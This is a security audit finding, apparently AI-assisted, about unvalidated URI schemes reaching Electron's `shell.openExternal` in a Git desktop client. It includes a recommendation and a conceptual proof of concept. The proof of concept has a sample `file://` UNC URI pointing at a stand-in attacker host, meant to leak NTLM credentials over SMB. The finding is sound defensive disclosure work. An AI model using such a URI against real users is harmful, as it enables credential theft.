## Finding

Two related pieces of evidence support this analog:

1. `app/src/ui/lib/sandboxed-markdown.tsx` explicitly treats link protocol as security-relevant. Its click interceptor only forwards a link to the app if the scheme is `http`/`https`: [1](#0-0) . This shows the authors know that untrusted (repo/PR/API-sourced) content must have its link scheme validated before being handed off.
2. That validation is *not* enforced at the boundary that actually performs the dangerous operation. `LinkButton.onClick` calls `shell.openExternal(uri)` directly with **no scheme check whatsoever**: [2](#0-1) . Likewise, the main-process IPC handler `open-external` only *logs* when the scheme is `http(s)` but calls `shell.openExternal(path)` unconditionally for **any** scheme: [3](#0-2) .

This is the same bug class as the RocketDAO report: a value (`_blockNumber` there, a URI scheme here) that must be constrained to a valid/expected range before being used in a sensitive operation is instead accepted unchecked at the point of use, while a sibling code path (`sandboxed-markdown.tsx`, or in the Solidity case, the surrounding voting-power logic) already assumes/enforces the invariant. The renderer-side check in `sandboxed-markdown.tsx` is not a substitute for main-process validation, because `LinkButton` and the `open-external` IPC channel are reachable from many other UI surfaces that render GitHub API data (author profile/blog URLs, check-run `details_url`/`target_url`, release links, repository homepage, etc.) without going through the markdown sandbox's protocol filter.

### Title
Unvalidated URI scheme passed to `shell.openExternal` via `LinkButton`/`open-external` IPC channel - (File: app/src/ui/lib/link-button.tsx, app/src/main-process/main.ts)

### Summary
`LinkButton` and the `open-external` IPC handler hand attacker-influencable strings straight to Electron's `shell.openExternal` without restricting the URI scheme to `http`/`https`, even though the codebase already implements exactly that restriction in one place (`sandboxed-markdown.tsx`) — proving the invariant is known but not consistently enforced.

### Finding Description
`shell.openExternal` asks the OS to invoke whatever handler is registered for a URI's scheme. Electron's own security guidance requires validating/limiting the schemes passed to this API, since arbitrary schemes can trigger dangerous OS-level handlers or, on Windows, `file://`/UNC-style targets that force outbound SMB authentication (credential/NTLM-hash leak) or invoke other installed protocol handlers.

`sandboxed-markdown.tsx` correctly enforces `/^https?:/.test(a.protocol)` before invoking `onMarkdownLinkClicked` [4](#0-3) . However `LinkButton`, which is a generic, widely-reused component whose `uri` prop is frequently populated from GitHub API data rendered in the UI, performs no such check before calling `shell.openExternal(uri)` [5](#0-4) . The main-process `open-external` IPC handler — the second-most-central chokepoint for this operation — has the same gap: it inspects the scheme only to decide whether to log, not whether to allow the call [3](#0-2) .

### Impact Explanation
If any GitHub API object rendered through `LinkButton` (e.g., a check-run's `details_url`, a commit status `target_url`, a user's profile/blog URL, a release asset link) can contain an attacker-chosen string, an attacker who controls that API object could smuggle a non-`http(s)` URI (e.g. a `file://\\attacker-host\share\x` UNC path, or a registered custom protocol handler) through `LinkButton`/`open-external` and into `shell.openExternal`, resulting in outbound credential exfiltration (SMB auth) or invocation of unintended local handlers — potentially code execution depending on installed handlers.

### Likelihood Explanation
Moderate/uncertain: I confirmed the missing validation at the two chokepoints (`LinkButton`, `open-external`), which is a real gap inconsistent with the sandboxed-markdown protection, but I was not able to enumerate, within the available tool budget, every concrete call site where `LinkButton`'s `uri` prop is populated directly and unsanitized from attacker-controlled GitHub API fields (vs. app-constructed, trusted `github.com` URLs). This limits confidence that a fully attacker-reachable path exists end-to-end without additional confirmation of a specific untrusted-data call site.

### Recommendation
Centralize scheme validation inside `shell.openExternal`'s wrapper (`app/src/lib/app-shell.ts`) and/or the `open-external` IPC handler in `app/src/main-process/main.ts`, rejecting (not just logging) any URI whose scheme is not `http:`/`https:`/`mailto:` as appropriate, so the guarantee doesn't depend on every caller (like `LinkButton`) remembering to pre-validate.

### Proof of Concept
Conceptual (not fully verified against a confirmed untrusted call site):
1. Attacker crafts a GitHub API object (e.g., a check-run or commit status) whose URL field is set to a non-http(s) URI, such as `file://\\attacker.example.com\share\evil.scf` or a registered custom protocol.
2. If any Desktop UI surface renders that field through a `LinkButton` with `uri={apiObject.someUrl}`, clicking it invokes `shell.openExternal(uri)` with no scheme check [5](#0-4) .
3. Electron/OS resolves the URI: a UNC-style `file://` path forces the OS to authenticate to the attacker's SMB server (credential/NTLM hash leak), or a registered handler is invoked with attacker-controlled arguments. [3](#0-2)
